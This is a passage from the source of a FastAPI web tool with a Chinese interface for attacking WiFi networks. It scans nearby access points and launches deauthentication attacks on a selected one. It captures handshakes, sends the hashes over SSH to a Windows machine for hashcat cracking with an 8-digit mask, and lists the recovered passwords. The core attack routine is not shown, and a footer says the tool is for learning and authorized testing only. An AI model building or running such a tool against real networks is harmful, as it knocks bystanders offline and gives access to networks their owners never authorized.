async def load_scan(filename: str):
    """加载历史扫描结果到当前状态"""
    global scan_state
    safe_name = os.path.basename(filename)
    fpath = SCANS_DIR / safe_name
    if not fpath.exists():
        return {"ok": False, "error": "扫描记录不存在"}
    try:
        with open(fpath, "r", encoding="utf-8") as f:
            data = json.load(f)
        with state_lock:
            scan_state = {
                "status": "done",
                "aps": data.get("aps", []),
                "started_at": None,
                "duration": data.get("duration", 0),
                "source": "loaded",
                "loaded_timestamp": data.get("timestamp", ""),
                "scan_file": safe_name,
            }
        return {"ok": True, "ap_count": len(data.get("aps", []))}
    except Exception as e:
        return {"ok": False, "error": str(e)}


@app.delete("/api/scans/{filename}")
async def delete_scan(filename: str):
    """删除历史扫描记录"""
    safe_name = os.path.basename(filename)
    fpath = SCANS_DIR / safe_name
    if fpath.exists():
        fpath.unlink()
    return {"ok": True}


@app.post("/api/attack/start")
async def start_attack(attack: AttackModel):
    t = threading.Thread(target=run_attack, args=(attack.bssid, attack.channel, attack.essid), daemon=True)
    t.start()
    return {"ok": True}


class AssetAttackModel(BaseModel):
    filename: str


@app.post("/api/attack/from_asset")
async def attack_from_asset(req: AssetAttackModel):
    t = threading.Thread(target=run_attack_from_asset, args=(req.filename,), daemon=True)
    t.start()
    return {"ok": True}


@app.get("/api/attack/status")
async def attack_status():
    with state_lock:
        return dict(attack_state)


@app.get("/api/known")
async def get_known():
    return load_known()


@app.delete("/api/known/{bssid}")
async def delete_known(bssid: str):
    known = load_known()
    known = [k for k in known if k["bssid"].lower() != bssid.lower()]
    save_known(known)
    return {"ok": True}


# ---- 资产管理 ----
@app.get("/api/assets")
async def list_assets():
    files = []
    for f in sorted(ASSETS_DIR.iterdir(), key=lambda x: x.stat().st_mtime, reverse=True):
        if f.is_file() and f.suffix in (".cap", ".hc22000", ".pcap"):
            st = f.stat()
            ftype = "哈希文件" if f.suffix == ".hc22000" else "抓包文件"
            files.append({
                "name": f.name,
                "size": st.st_size,
                "size_human": f"{st.st_size/1024:.1f} KB" if st.st_size < 1024*1024 else f"{st.st_size/1024/1024:.2f} MB",
                "type": ftype,
                "modified": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(st.st_mtime)),
            })
    return files


@app.get("/api/assets/{filename}")
async def download_asset(filename: str):
    # 防止路径遍历
    safe_name = os.path.basename(filename)
    fpath = ASSETS_DIR / safe_name
    if not fpath.exists():
        return {"error": "文件不存在"}
    return FileResponse(str(fpath), filename=safe_name)


@app.delete("/api/assets/{filename}")
async def delete_asset(filename: str):
    safe_name = os.path.basename(filename)
    fpath = ASSETS_DIR / safe_name
    if fpath.exists():
        fpath.unlink()
        return {"ok": True}
    return {"ok": False, "error": "文件不存在"}


# ============================================================
# 前端页面
# ============================================================
HTML_PAGE = r"""
<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>WiFi 测试工具</title>
<style>
:root {
  --bg: #0d1117;
  --bg2: #161b22;
  --bg3: #1c2128;
  --border: #30363d;
  --text: #e6edf3;
  --text2: #8b949e;
  --accent: #58a6ff;
  --accent2: #1f6feb;
  --green: #3fb950;
  --red: #f85149;
  --yellow: #d29922;
  --purple: #bc8cff;
}
* { margin:0; padding:0; box-sizing:border-box; }
body {
  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'PingFang SC', 'Microsoft YaHei', sans-serif;
  background: var(--bg);
  color: var(--text);
  min-height: 100vh;
}
.header {
  background: var(--bg2);
  border-bottom: 1px solid var(--border);
  padding: 16px 24px;
  display: flex;
  align-items: center;
  justify-content: space-between;
}
.header h1 {
  font-size: 20px;
  font-weight: 600;
  display: flex;
  align-items: center;
  gap: 10px;
}
.header h1 .dot {
  width: 10px; height: 10px;
  background: var(--green);
  border-radius: 50%;
  box-shadow: 0 0 8px var(--green);
}
.tabs {
  display: flex;
  gap: 4px;
}
.tab {
  padding: 8px 16px;
  border-radius: 6px;
  cursor: pointer;
  font-size: 14px;
  color: var(--text2);
  transition: all 0.15s;
  border: none;
  background: transparent;
}
.tab:hover { background: var(--bg3); color: var(--text); }
.tab.active { background: var(--accent2); color: #fff; }
.container { max-width: 1200px; margin: 0 auto; padding: 24px; }
.panel { display: none; }
.panel.active { display: block; }
.card {
  background: var(--bg2);
  border: 1px solid var(--border);
  border-radius: 12px;
  padding: 20px;
  margin-bottom: 16px;
}
.card-title {
  font-size: 16px;
  font-weight: 600;
  margin-bottom: 16px;
  display: flex;
  align-items: center;
  gap: 8px;
}
.btn {
  padding: 10px 20px;
  border-radius: 8px;
  border: none;
  cursor: pointer;
  font-size: 14px;
  font-weight: 500;
  transition: all 0.15s;
  display: inline-flex;
  align-items: center;
  gap: 8px;
}
.btn-primary { background: var(--accent2); color: #fff; }
.btn-primary:hover { background: #388bfd; }
.btn-primary:disabled { background: var(--bg3); color: var(--text2); cursor: not-allowed; }
.btn-danger { background: var(--red); color: #fff; }
.btn-danger:hover { background: #ff7b72; }
.btn-ghost { background: var(--bg3); color: var(--text); border: 1px solid var(--border); }
.btn-ghost:hover { background: var(--border); }
.btn-sm { padding: 6px 12px; font-size: 12px; }
table {
  width: 100%;
  border-collapse: collapse;
  font-size: 13px;
}
th {
  text-align: left;
  padding: 10px 12px;
  color: var(--text2);
  font-weight: 500;
  border-bottom: 1px solid var(--border);
  font-size: 12px;
  text-transform: uppercase;
  letter-spacing: 0.5px;
}
td {
  padding: 10px 12px;
  border-bottom: 1px solid var(--border);
}
tr:hover { background: var(--bg3); }
.signal-bar {
  display: inline-flex;
  align-items: flex-end;
  gap: 2px;
  height: 16px;
}
.signal-bar span {
  width: 3px;
  background: var(--border);
  border-radius: 1px;
}
.signal-bar span.active { background: var(--green); }
.badge {
  display: inline-block;
  padding: 2px 8px;
  border-radius: 4px;
  font-size: 11px;
  font-weight: 500;
}
.badge-green { background: rgba(63,185,80,0.15); color: var(--green); }
.badge-red { background: rgba(248,81,73,0.15); color: var(--red); }
.badge-yellow { background: rgba(210,153,34,0.15); color: var(--yellow); }
.badge-blue { background: rgba(88,166,255,0.15); color: var(--accent); }
.badge-purple { background: rgba(188,140,255,0.15); color: var(--purple); }
.status-box {
  padding: 12px 16px;
  border-radius: 8px;
  font-size: 14px;
  margin-bottom: 16px;
  display: flex;
  align-items: center;
  gap: 10px;
}
.status-idle { background: var(--bg3); color: var(--text2); }
.status-running { background: rgba(88,166,255,0.1); color: var(--accent); border: 1px solid rgba(88,166,255,0.3); }
.status-success { background: rgba(63,185,80,0.1); color: var(--green); border: 1px solid rgba(63,185,80,0.3); }
.status-failed { background: rgba(248,81,73,0.1); color: var(--red); border: 1px solid rgba(248,81,73,0.3); }
.spinner {
  width: 16px; height: 16px;
  border: 2px solid var(--border);
  border-top-color: var(--accent);
  border-radius: 50%;
  animation: spin 0.8s linear infinite;
}
@keyframes spin { to { transform: rotate(360deg); } }
.log-box {
  background: #000;
  border: 1px solid var(--border);
  border-radius: 8px;
  padding: 16px;
  font-family: 'Cascadia Code', 'Consolas', monospace;
  font-size: 12px;
  line-height: 1.6;
  max-height: 400px;
  overflow-y: auto;
  color: #c9d1d9;
}
.log-box .log-time { color: var(--text2); }
.result-card {
  background: linear-gradient(135deg, rgba(63,185,80,0.1), rgba(63,185,80,0.05));
  border: 1px solid rgba(63,185,80,0.3);
  border-radius: 12px;
  padding: 24px;
  text-align: center;
}
.result-card .ssid { font-size: 18px; font-weight: 600; margin-bottom: 8px; }
.result-card .password {
  font-size: 36px;
  font-weight: 700;
  color: var(--green);
  font-family: 'Cascadia Code', monospace;
  letter-spacing: 4px;
  margin: 16px 0;
}
.result-card .meta { color: var(--text2); font-size: 13px; }
.form-grid {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 16px;
}
.form-group { display: flex; flex-direction: column; gap: 6px; }
.form-group label {
  font-size: 12px;
  color: var(--text2);
  font-weight: 500;
}
.form-group input, .form-group select {
  padding: 10px 12px;
  background: var(--bg);
  border: 1px solid var(--border);
  border-radius: 8px;
  color: var(--text);
  font-size: 14px;
  outline: none;
  transition: border-color 0.15s;
}
.form-group input:focus { border-color: var(--accent); }
.form-group.full { grid-column: 1 / -1; }
.known-grid {
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
  gap: 16px;
}
.known-card {
  background: var(--bg2);
  border: 1px solid var(--border);
  border-radius: 12px;
  padding: 20px;
  position: relative;
}
.known-card .k-ssid { font-size: 16px; font-weight: 600; margin-bottom: 4px; }
.known-card .k-bssid { font-size: 11px; color: var(--text2); font-family: monospace; margin-bottom: 12px; }
.known-card .k-password {
  font-size: 22px;
  font-weight: 700;
  color: var(--green);
  font-family: monospace;
  letter-spacing: 2px;
}
.known-card .k-meta { font-size: 11px; color: var(--text2); margin-top: 8px; }
.known-card .k-del {
  position: absolute;
  top: 12px; right: 12px;
  background: none;
  border: none;
  color: var(--text2);
  cursor: pointer;
  font-size: 16px;
  padding: 4px;
}
.known-card .k-del:hover { color: var(--red); }
.empty-state {
  text-align: center;
  padding: 48px 24px;
  color: var(--text2);
}
.empty-state .icon { font-size: 48px; margin-bottom: 16px; opacity: 0.5; }
.progress-bar {
  width: 100%;
  height: 4px;
  background: var(--bg3);
  border-radius: 2px;
  overflow: hidden;
  margin-top: 8px;
}
.progress-bar .fill {
  height: 100%;
  background: var(--accent);
  border-radius: 2px;
  transition: width 0.3s;
}
.footer {
  text-align: center;
  padding: 24px;
  color: var(--text2);
  font-size: 12px;
}
</style>
</head>
<body>

<div class="header">
  <h1><span class="dot"></span> WiFi 测试工具</h1>
  <div class="tabs">
    <button class="tab active" onclick="switchTab('scan')">扫描</button>
    <button class="tab" onclick="switchTab('assets')">资产</button>
    <button class="tab" onclick="switchTab('attack')">攻击</button>
    <button class="tab" onclick="switchTab('known')">已知 WiFi</button>
    <button class="tab" onclick="switchTab('config')">配置</button>
  </div>
</div>

<div class="container">

  <!-- 扫描面板 -->
  <div id="panel-scan" class="panel active">
    <div class="card">
      <div class="card-title">
        <span>周围 WiFi 扫描</span>
      </div>
      <div id="scan-status" class="status-box status-idle">
        <span>就绪，点击下方按钮开始扫描</span>
      </div>
      <div style="display:flex; gap:12px; align-items:center; flex-wrap:wrap;">
        <button id="scan-btn" class="btn btn-primary" onclick="toggleScan()">开始持续扫描</button>
        <button class="btn btn-ghost" onclick="toggleScanHistory()" style="font-size:13px;">📂 历史扫描 (<span id="history-count">0</span>)</button>
        <span style="color:var(--text2); font-size:13px;" id="scan-info"></span>
      </div>
      <div id="scan-history" style="display:none; margin-top:16px; padding-top:16px; border-top:1px solid var(--border);">
        <div style="font-size:13px; color:var(--text2); margin-bottom:10px; font-weight:500;">历史扫描记录（点击加载，无需重新扫描）</div>
        <div id="history-list" style="display:flex; flex-direction:column; gap:8px;"></div>
      </div>
    </div>
    <div class="card">
      <div class="card-title">AP 列表</div>
      <div id="ap-list">
        <div class="empty-state">
          <div class="icon">📡</div>
          <div>暂无数据，点击「开始扫描」</div>
        </div>
      </div>
    </div>
  </div>

  <!-- 资产面板 -->
  <div id="panel-assets" class="panel">
    <div class="card">
      <div class="card-title">
        <span>捕获文件资产</span>
        <span style="margin-left:auto; font-size:12px; color:var(--text2); font-weight:normal;">抓包和哈希文件自动归档，可离线手动跑 Hashcat</span>
      </div>
      <div style="display:flex; gap:12px; align-items:center; margin-bottom:16px;">
        <button class="btn btn-ghost btn-sm" onclick="loadAssets()">刷新列表</button>
        <span style="color:var(--text2); font-size:12px;">.cap = 原始抓包 / .hc22000 = Hashcat 哈希</span>
      </div>
      <div id="assets-list">
        <div class="empty-state">
          <div class="icon">📁</div>
          <div>暂无资产文件，攻击成功后自动归档</div>
        </div>
      </div>
    </div>
  </div>

  <!-- 攻击面板 -->
  <div id="panel-attack" class="panel">
    <div class="card">
      <div class="card-title">攻击目标</div>
      <div id="attack-target" style="margin-bottom:16px; color:var(--text2);">
        尚未选择目标，请在「扫描」页面点击 AP 的「攻击」按钮
      </div>
      <div id="attack-status" class="status-box status-idle">
        <span>等待开始</span>
      </div>
      <div style="display:flex; gap:12px; margin-top:16px;">
        <button id="attack-btn" class="btn btn-primary" onclick="startAttack()" disabled>开始攻击</button>
      </div>
    </div>
    <div class="card">
      <div class="card-title">实时日志</div>
      <div id="attack-log" class="log-box">等待攻击开始...</div>
    </div>
    <div id="attack-result"></div>
  </div>

  <!-- 已知 WiFi 面板 -->
  <div id="panel-known" class="panel">
    <div class="card">
      <div class="card-title">已破解 WiFi 列表</div>
      <div id="known-list" class="known-grid"></div>
    </div>
  </div>

  <!-- 配置面板 -->
  <div id="panel-config" class="panel">
    <div class="card">
      <div class="card-title">Windows 计算节点配置</div>
      <div class="form-grid">
        <div class="form-group">
          <label>Windows IP / 主机名</label>
          <input id="cfg-host" placeholder="192.168.1.100">
        </div>
        <div class="form-group">
          <label>SSH 端口</label>
          <input id="cfg-port" type="number" value="22">
        </div>
        <div class="form-group">
          <label>Windows 用户名</label>
          <input id="cfg-user" placeholder="Administrator">
        </div>
        <div class="form-group">
          <label>Windows 密码（留空则用免密登录）</label>
          <input id="cfg-password" type="password" placeholder="密码">
        </div>
        <div class="form-group">
          <label>Hashcat 路径</label>
          <input id="cfg-hashcat" placeholder="C:\hashcat-6.2.6\hashcat.exe">
        </div>
      </div>
    </div>
    <div class="card">
      <div class="card-title">攻击参数</div>
      <div class="form-grid">
        <div class="form-group">
          <label>扫描时长（秒）</label>
          <input id="cfg-scan" type="number" value="20">
        </div>
        <div class="form-row">
          <label>实时刷新间隔（秒）</label>
          <input id="cfg-refresh" type="number" value="2" min="1" max="10">
        </div>
        <div class="form-row">
          <label>持续扫描（不自动停止）</label>
          <label style="display:flex;align-items:center;gap:8px;cursor:pointer;">
            <input type="checkbox" id="cfg-continuous" style="width:auto;">
            <span style="font-size:12px;color:var(--text2);">开启后扫描持续运行，手动停止</span>
          </label>
        </div>
        <div class="form-group">
          <label>Deauth 轮数</label>
          <input id="cfg-rounds" type="number" value="3">
        </div>
        <div class="form-group">
          <label>每轮 Deauth 帧数</label>
          <input id="cfg-frames" type="number" value="10">
        </div>
        <div class="form-group">
          <label>每轮等待时间（秒）</label>
          <input id="cfg-wait" type="number" value="18">
        </div>
      </div>
    </div>
    <div class="card">
      <div class="card-title">Hashcat 参数</div>
      <div class="form-grid">
        <div class="form-group">
          <label>哈希模式</label>
          <input id="cfg-mode" value="22000">
        </div>
        <div class="form-group">
          <label>掩码</label>
          <input id="cfg-mask" value="?d?d?d?d?d?d?d?d">
        </div>
      </div>
      <div style="margin-top:16px; display:flex; gap:12px; align-items:center; flex-wrap:wrap;">
        <button class="btn btn-primary" onclick="saveConfig()">保存配置</button>
        <button id="test-btn" class="btn btn-ghost" onclick="testWorker()">测试连接</button>
        <span id="cfg-saved" style="color:var(--green); font-size:13px; display:none;">已保存 ✓</span>
      </div>
      <div id="test-result" style="margin-top:16px; display:none;">
        <div id="test-status" class="status-box"></div>
        <div id="test-steps" style="margin-top:12px;"></div>
      </div>
    </div>
  </div>

</div>

<div class="footer">WiFi 测试工具 · 仅供学习与授权测试使用</div>

<script>
let currentTarget = null;
let scanPoller = null;
let sortField = 'power';
let sortDir = 'desc';
let attackPoller = null;

function switchTab(name) {
  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
  document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
  event.target.classList.add('active');
  document.getElementById('panel-' + name).classList.add('active');
  if (name === 'known') loadKnown();
  if (name === 'assets') loadAssets();
  if (name === 'config') loadConfig();
}

// ---- 扫描 ----
let isScanning = false;

async function toggleScan() {
  if (isScanning) {
    await stopScan();
  } else {
    await startScan();
  }
}

async function startScan() {
  isScanning = true;
  const btn = document.getElementById('scan-btn');
  btn.disabled = true;
  btn.textContent = '停止扫描';
  btn.className = 'btn btn-danger';
  document.getElementById('scan-info').textContent = '持续扫描中，每 ' + (document.getElementById('cfg-refresh')?.value || 2) + ' 秒刷新';
  document.getElementById('scan-status').className = 'status-box status-running';
  document.getElementById('scan-status').innerHTML = '<span class="spinner"></span> 正在扫描周围 WiFi...';
  document.getElementById('ap-list').innerHTML = '';
  await fetch('/api/scan/start', {method: 'POST'});
  if (scanPoller) clearInterval(scanPoller);
  scanPoller = setInterval(pollScan, 1000);
  btn.disabled = false;
}

async function stopScan() {
  await fetch('/api/scan/stop', {method: 'POST'});
  isScanning = false;
  const btn = document.getElementById('scan-btn');
  btn.disabled = true;
  btn.textContent = '开始扫描';
  btn.className = 'btn btn-primary';
}

function toggleScanHistory() {
  const el = document.getElementById('scan-history');
  el.style.display = el.style.display === 'none' ? 'block' : 'none';
  if (el.style.display === 'block') loadScanHistory();
}

async function loadScanHistory() {
  try {
    const r = await fetch('/api/scans');
    const data = await r.json();
    const list = data.scans || [];
    document.getElementById('history-count').textContent = list.length;
    const container = document.getElementById('history-list');
    if (!list.length) {
      container.innerHTML = '<div style="color:var(--text3);font-size:12px;padding:8px 0;">暂无历史记录</div>';
      return;
    }
    let html = '';
    list.forEach(s => {
      const timeInfo = s.started_at ? s.started_at + ' ~ ' + (s.ended_at || '') : s.timestamp;
      html += '<div style="display:flex;align-items:center;justify-content:space-between;padding:10px 14px;background:var(--bg2);border:1px solid var(--border);border-radius:8px;">'
        + '<div style="display:flex;align-items:center;gap:14px;flex-wrap:wrap;">'
        + '<span style="font-family:monospace;font-size:12px;color:var(--text);">' + timeInfo + '</span>'
        + '<span class="badge badge-blue">' + s.ap_count + ' AP</span>'
        + '<span class="badge" style="background:rgba(34,197,94,0.15);color:#4ade80;font-size:10px;">' + s.duration + ' 秒</span>'
        + '<span style="color:var(--text3);font-size:11px;">' + s.size_kb + 'KB</span>'
        + '</div>'
        + '<div style="display:flex;gap:8px;">'
        + '<button class="btn btn-sm btn-primary" onclick="loadScan(\'' + s.filename + '\')">加载</button>'
        + '<button class="btn btn-sm btn-ghost" onclick="deleteScan(\'' + s.filename + '\')" style="color:var(--red)">删除</button>'
        + '</div></div>';
    });
    container.innerHTML = html;
  } catch(e) {
    console.error('loadScanHistory error', e);
  }
}

async function loadScan(filename) {
  const r = await fetch('/api/scans/' + encodeURIComponent(filename));
  const data = await r.json();
  if (data.ok) {
    pollScan();
    document.getElementById('scan-history').style.display = 'none';
  } else {
    alert('加载失败: ' + (data.error || ''));
  }
}

async function deleteScan(filename) {
  if (!confirm('确认删除这条历史记录？')) return;
  await fetch('/api/scans/' + encodeURIComponent(filename), {method: 'DELETE'});
  loadScanHistory();
}

async function pollScan() {
  const r = await fetch('/api/scan/status');
  const data = await r.json();
  if (data.status === 'scanning') {
    const elapsed = Math.floor((Date.now()/1000) - (data.started_at || Date.now()/1000));
    const apCount = data.aps ? data.aps.length : 0;
    document.getElementById('scan-info').textContent = '已扫描 ' + elapsed + ' 秒 / 发现 ' + apCount + ' 个 AP（实时刷新）';
    if (data.aps && data.aps.length) renderAPs(data.aps);
  } else if (data.status === 'done') {
    clearInterval(scanPoller);
    isScanning = false;
    const btn = document.getElementById('scan-btn');
    btn.disabled = false;
    btn.textContent = '重新持续扫描';
    btn.className = 'btn btn-primary';
    renderAPs(data.aps);
    if (data.source === 'loaded') {
      document.getElementById('scan-status').className = 'status-box status-success';
      document.getElementById('scan-status').innerHTML = '已加载历史扫描结果（' + (data.loaded_timestamp || '') + '），共 ' + data.aps.length + ' 个 AP';
    } else {
      document.getElementById('scan-status').className = 'status-box status-success';
      document.getElementById('scan-status').innerHTML = '扫描完成，共发现 ' + data.aps.length + ' 个 AP';
    }
    document.getElementById('scan-info').textContent = '';
    loadScanHistory();
  } else if (data.status === 'error') {
    clearInterval(scanPoller);
    isScanning = false;
    const btn = document.getElementById('scan-btn');
    btn.disabled = false;
    btn.textContent = '开始持续扫描';
    btn.className = 'btn btn-primary';
    document.getElementById('scan-status').className = 'status-box status-failed';
    document.getElementById('scan-status').textContent = '扫描失败: ' + (data.error || '');
  }
}

function setSort(field) {
  if (sortField === field) {
    sortDir = sortDir === 'desc' ? 'asc' : 'desc';
  } else {
    sortField = field;
    sortDir = 'desc';
  }
  // 重新渲染当前列表
  fetch('/api/scan/status').then(r => r.json()).then(data => {
    if (data.aps && data.aps.length) renderAPs(data.aps);
  });
}

function sortArrow(field) {
  if (sortField !== field) return '';
  return sortDir === 'desc' ? '↓' : '↑';
}

function getBandBadge(channel) {
  const ch = parseInt(channel) || 0;
  if (ch >= 1 && ch <= 14) return '<span class="badge" style="background:rgba(59,130,246,0.15);color:#60a5fa;font-size:10px;padding:1px 6px;">2.4G</span>';
  if (ch >= 36) return '<span class="badge" style="background:rgba(168,85,247,0.15);color:#c084fc;font-size:10px;padding:1px 6px;">5G</span>';
  return '';
}

function signalBars(power) {
  const level = power > -50 ? 4 : power > -65 ? 3 : power > -75 ? 2 : 1;
  let html = '<div class="signal-bar">';
  for (let i = 1; i <= 4; i++) {
    html += `<span style="height:${i*4}px" class="${i <= level ? 'active' : ''}"></span>`;
  }
  html += '</div>';
  return html;
}

function renderAPs(aps) {
  if (!aps.length) {
    document.getElementById('ap-list').innerHTML = '<div class="empty-state"><div class="icon">📡</div><div>未发现 AP</div></div>';
    return;
  }
  let html = '<table><thead><tr>'
    + '<th style="cursor:pointer" onclick="setSort(\'power\')">信号 ' + sortArrow('power') + '</th>'
    + '<th style="cursor:pointer" onclick="setSort(\'essid\')">ESSID ' + sortArrow('essid') + '</th>'
    + '<th>BSSID</th>'
    + '<th style="cursor:pointer" onclick="setSort(\'channel\')">频道 ' + sortArrow('channel') + '</th>'
    + '<th>加密</th>'
    + '<th style="cursor:pointer" onclick="setSort(\'client_count\')">用户 ' + sortArrow('client_count') + '</th>'
    + '<th>操作</th></tr></thead><tbody>';
  const sorted = [...aps].sort((a, b) => {
    let va = a[sortField], vb = b[sortField];
    if (typeof va === 'string') { va = (va||'').toLowerCase(); vb = (vb||'').toLowerCase(); }
    if (sortDir === 'asc') return va > vb ? 1 : -1;
    return va < vb ? 1 : -1;
  });
  sorted.forEach((ap, idx) => {
    const enc = ap.privacy || '';
    let badge = '<span class="badge badge-blue">' + enc + '</span>';
    if (enc.includes('WPA3')) badge = '<span class="badge badge-purple">WPA3</span>';
    else if (enc.includes('WPA2')) badge = '<span class="badge badge-green">WPA2</span>';
    else if (enc === 'OPN' || enc === '') badge = '<span class="badge badge-red">开放</span>';
    const cc = ap.client_count || 0;
    const userBadge = cc > 0
      ? '<span class="badge badge-green" style="cursor:pointer" title="点击查看客户端">' + cc + '</span>'
      : '<span class="badge" style="background:var(--bg2);color:var(--text3)">0</span>';
    const rowId = 'ap-row-' + idx;
    const detailId = 'ap-detail-' + idx;
    html += '<tr id="' + rowId + '" style="cursor:pointer" onclick="toggleAPDetail(' + idx + ')">'
      + '<td>' + signalBars(ap.power) + ' <span style="color:var(--text2);font-size:11px">' + ap.power + 'dBm</span></td>'
      + '<td style="font-weight:500">' + escapeHtml(ap.essid) + ' ' + getBandBadge(ap.channel) + '</td>'
      + '<td style="font-family:monospace;font-size:12px;color:var(--text2)">' + ap.bssid + '</td>'
      + '<td>' + ap.channel + '</td>'
      + '<td>' + badge + '</td>'
      + '<td>' + userBadge + '</td>'
      + '<td onclick="event.stopPropagation()"><button class="btn btn-sm btn-primary" onclick="selectTarget(\'' + ap.bssid + '\',' + ap.channel + ',\'' + escapeHtml(ap.essid).replace(/'/g, "\\'") + '\')">攻击</button></td>'
      + '</tr>';
    // 展开详情行
    html += '<tr id="' + detailId + '" style="display:none"><td colspan="7" style="padding:0;border:none;background:var(--bg2)">';
    if (cc > 0 && ap.clients) {
      html += '<div style="padding:12px 16px;border-left:3px solid var(--accent)">';
      html += '<div style="font-size:12px;color:var(--text2);margin-bottom:8px;font-weight:500">关联客户端 (' + cc + ')</div>';
      html += '<table style="margin:0"><thead><tr><th>客户端 MAC</th><th>厂商</th><th>信号</th><th>数据包</th></tr></thead><tbody>';
      ap.clients.forEach(c => {
        const vendor = c.vendor || '未知';
        const randTag = c.is_random ? '<span class="badge" style="background:rgba(250,204,21,0.15);color:#facc15;font-size:9px;padding:0 4px;margin-left:4px;">随机MAC</span>' : '';
        html += '<tr>'
          + '<td style="font-family:monospace;font-size:12px">' + c.mac + randTag + '</td>'
          + '<td style="font-size:11px;color:var(--text2);max-width:140px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;" title="' + vendor + '">' + vendor + '</td>'
          + '<td><span style="color:' + (c.power > -60 ? '#4ade80' : c.power > -75 ? '#facc15' : '#f87171') + '">' + c.power + ' dBm</span></td>'
          + '<td style="font-family:monospace;font-size:12px">' + c.packets + '</td>'
          + '</tr>';
      });
      html += '</tbody></table></div>';
    } else {
      html += '<div style="padding:12px 16px;color:var(--text3);font-size:12px">暂无关联客户端（可能是新 AP 或客户端处于休眠）</div>';
    }
    html += '</td></tr>';
  });
  html += '</tbody></table>';
  document.getElementById('ap-list').innerHTML = html;
}

function toggleAPDetail(idx) {
  const el = document.getElementById('ap-detail-' + idx);
  if (el) {
    el.style.display = el.style.display === 'none' ? '' : 'none';
  }
}

function escapeHtml(s) {
  const d = document.createElement('div');
  d.textContent = s;
  return d.innerHTML;
}

// 页面加载时获取历史扫描记录（直接调用，script 在页面底部，DOM 已就绪）
loadScanHistory();

function selectTarget(bssid, channel, essid) {
  currentTarget = {bssid, channel, essid};
  document.getElementById('attack-target').innerHTML =
    `<span style="color:var(--text);font-weight:500">${escapeHtml(essid)}</span>
     <span style="color:var(--text2);font-family:monospace;font-size:12px;margin-left:12px">${bssid}</span>
     <span class="badge badge-blue" style="margin-left:12px">CH ${channel}</span>`;
  document.getElementById('attack-btn').disabled = false;
  switchTab('attack');
  document.querySelectorAll('.tab')[1].classList.add('active');
  document.querySelectorAll('.tab')[0].classList.remove('active');
}

// ---- 攻击 ----
async function startAttack() {
  if (!currentTarget) return;
  const btn = document.getElementById('attack-btn');
  btn.disabled = true;
  btn.innerHTML = '<span class="spinner"></span> 攻击中...';
  document.getElementById('attack-result').innerHTML = '';
  document.getElementById('attack-log').innerHTML = '';

  await fetch('/api/attack/start', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(currentTarget)
  });

  if (attackPoller) clearInterval(attackPoller);
  attackPoller = setInterval(pollAttack, 1500);
}

const STATUS_MAP = {
  'idle': ['status-idle', '等待开始'],
  'starting': ['status-running', '初始化...'],
  'scanning_clients': ['status-running', '扫描目标频道，寻找客户端...'],
  'capturing': ['status-running', '抓包中...'],
  'converting': ['status-running', '转换哈希格式...'],
  'uploading': ['status-running', '上传哈希到 Windows...'],
  'cracking': ['status-running', 'Hashcat 破解中...'],
  'success': ['status-success', '破解成功！'],
  'failed': ['status-failed', '攻击失败'],
  'exhausted': ['status-failed', '掩码未命中'],
  'error': ['status-failed', '发生错误'],
};

async function pollAttack() {
  const r = await fetch('/api/attack/status');
  const data = await r.json();

  // 状态
  let [cls, text] = STATUS_MAP[data.status] || ['status-running', data.status];
  if (data.status.startsWith('deauth_round_')) {
    cls = 'status-running';
    text = 'Deauth 攻击中（第 ' + data.status.split('_')[2] + ' 轮）...';
  }
  const sb = document.getElementById('attack-status');
  sb.className = 'status-box ' + cls;
  sb.innerHTML = (cls.includes('running') ? '<span class="spinner"></span> ' : '') + text;

  // 日志
  const logBox = document.getElementById('attack-log');
  if (data.log && data.log.length) {
    logBox.innerHTML = data.log.map(l =>
      `<div><span class="log-time">${l.substring(0,10)}</span> ${escapeHtml(l.substring(11))}</div>`
    ).join('');
    logBox.scrollTop = logBox.scrollHeight;
  }

  // 结束状态
  if (['success', 'failed', 'exhausted', 'error'].includes(data.status)) {
    clearInterval(attackPoller);
    const btn = document.getElementById('attack-btn');
    btn.disabled = false;
    btn.textContent = '重新攻击';

    if (data.status === 'success' && data.result) {
      document.getElementById('attack-result').innerHTML = `
        <div class="result-card">
          <div class="ssid">${escapeHtml(data.result.essid)}</div>
          <div style="color:var(--text2);font-size:13px;font-family:monospace">${data.result.bssid}</div>
          <div class="password">${escapeHtml(data.result.password)}</div>
          <div class="meta">已保存到「已知 WiFi」列表</div>
        </div>`;
    } else if (data.result && data.result.error) {
      document.getElementById('attack-result').innerHTML = `
        <div class="card" style="border-color:var(--red)">
          <div style="color:var(--red);font-weight:500;margin-bottom:8px">失败原因</div>
          <div style="color:var(--text2);font-size:13px">${escapeHtml(data.result.error)}</div>
        </div>`;
    }
  }
}

// ---- 已知 WiFi ----
async function loadKnown() {
  const r = await fetch('/api/known');
  const data = await r.json();
  const list = document.getElementById('known-list');
  if (!data.length) {
    list.innerHTML = '<div class="empty-state" style="grid-column:1/-1"><div class="icon">🔓</div><div>暂无已破解的 WiFi</div></div>';
    return;
  }
  list.innerHTML = data.map(k => `
    <div class="known-card">
      <button class="k-del" onclick="deleteKnown('${k.bssid}')">×</button>
      <div class="k-ssid">${escapeHtml(k.essid)}</div>
      <div class="k-bssid">${k.bssid} · CH ${k.channel}</div>
      <div class="k-password">${escapeHtml(k.password)}</div>
      <div class="k-meta">破解于 ${k.cracked_at}${k.client ? ' · 客户端 ' + k.client : ''}</div>
    </div>
  `).join('');
}

async function deleteKnown(bssid) {
  if (!confirm('确认删除这条记录？')) return;
  await fetch('/api/known/' + bssid, {method: 'DELETE'});
  loadKnown();
}

// ---- 资产管理 ----
async function loadAssets() {
  const r = await fetch('/api/assets');
  const files = await r.json();
  const list = document.getElementById('assets-list');
  if (!files.length) {
    list.innerHTML = '<div class="empty-state"><div class="icon">📁</div><div>暂无资产文件，攻击成功后自动归档</div></div>';
    return;
  }
  let html = '<table><thead><tr><th>文件名</th><th>类型</th><th>大小</th><th>归档时间</th><th>操作</th></tr></thead><tbody>';
  files.forEach(f => {
    const badge = f.type === '哈希文件'
      ? '<span class="badge badge-green">哈希</span>'
